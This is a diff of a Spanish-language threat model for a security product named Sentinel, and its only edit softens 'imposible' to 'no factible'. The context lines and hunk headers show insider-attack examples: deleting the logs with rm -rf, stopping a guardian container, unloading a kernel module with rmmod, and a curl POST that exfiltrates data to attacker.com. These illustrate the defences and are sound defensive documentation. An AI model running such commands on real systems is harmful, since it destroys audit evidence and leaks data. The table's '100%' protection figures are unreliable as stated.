@@ -38,7 +38,7 @@ Admin malicioso:
 5. Sale limpio → Sin rastro
 ```
 
-**Resultado**: Sistema comprometido, cero evidencia, imposible auditar
+**Resultado**: Sistema comprometido, cero evidencia, no factible auditar
 
 ---
 
@@ -58,7 +58,7 @@ sudo rm -rf /var/log/sentinel/*
 1. **Security Lane (WAL Forense)**:
    - Logs ya están en WAL (write-ahead log)
    - WAL tiene fsync inmediato (0.01ms)
-   - Imposible borrar sin dejar rastro
+   - no factible borrar sin dejar rastro
 
 2. **Dual-Guardian (Claim 3)**:
    - Guardian-Alpha (eBPF) intercepta syscalls
@@ -69,7 +69,7 @@ sudo rm -rf /var/log/sentinel/*
 3. **Audit Trail Inmutable**:
    - Evento registrado en S3 (append-only)
    - Timestamp criptográfico
-   - Imposible alterar sin detección
+   - no factible alterar sin detección
 
 **Resultado**: ❌ Ataque bloqueado, ✅ Evidencia preservada
 
@@ -99,7 +99,7 @@ sudo docker stop sentinel-guardian-alpha
 3. **External Monitoring**:
    - Prometheus scraping desde fuera del host
    - Alertmanager independiente
-   - Imposible deshabilitar sin acceso a cluster
+   - no factible deshabilitar sin acceso a cluster
 
 **Resultado**: ❌ Ataque detectado, ✅ Sistema auto-recupera
 
@@ -126,7 +126,7 @@ rmmod guardian_alpha  # Remover módulo kernel
 2. **Seccomp Sandboxing**:
    - Guardian-Alpha corre en seccomp strict mode
    - Solo syscalls permitidos: read, write, exit
-   - Imposible ejecutar comandos arbitrarios
+   - no factible ejecutar comandos arbitrarios
 
 3. **Immutable Infrastructure**:
    - Guardian-Alpha en container read-only
@@ -173,7 +173,7 @@ curl -X POST https://attacker.com/exfil \
 |----------------|---------------------|------------------------|---------|
 | **Deshabilitar logging** | ✅ Posible | ❌ Bloqueado (WAL + eBPF) | **100%** |
 | **Deshabilitar monitoring** | ✅ Posible | ❌ Detectado (Mutual surveillance) | **100%** |
-| **Borrar evidencia** | ✅ Posible | ❌ Imposible (Immutable audit trail) | **100%** |
+| **Borrar evidencia** | ✅ Posible | ❌ no factible (Immutable audit trail) | **100%** |
 | **Modificar kernel** | ✅ Posible | ⚠️ Detectado (LSM hooks) | **90%** |
 | **Exfiltrar datos** | ✅ Posible | ❌ Bloqueado (Egress monitoring) | **95%** |
 | **Ejecutar malware** | ✅ Posible | ❌ Bloqueado (Seccomp + eBPF) | **100%** |
@@ -288,7 +288,7 @@ curl -X POST https://attacker.com/exfil \
 
 **Claim 3 (Dual-Guardian) es especialmente valioso contra insider threats**:
 
-> "Arquitectura de dual-guardián donde Guardian-Alpha (kernel-level) y Guardian-Beta (application-level) se monitorean mutuamente, haciendo **imposible** para un usuario interno malicioso deshabilitar ambos guardianes simultáneamente sin dejar evidencia forense inmutable."
+> "Arquitectura de dual-guardián donde Guardian-Alpha (kernel-level) y Guardian-Beta (application-level) se monitorean mutuamente, haciendo **no factible** para un usuario interno malicioso deshabilitar ambos guardianes simultáneamente sin dejar evidencia forense inmutable."
 
 **Diferenciador clave**: Protección contra **admin root malicioso**, no solo atacantes externos.
 
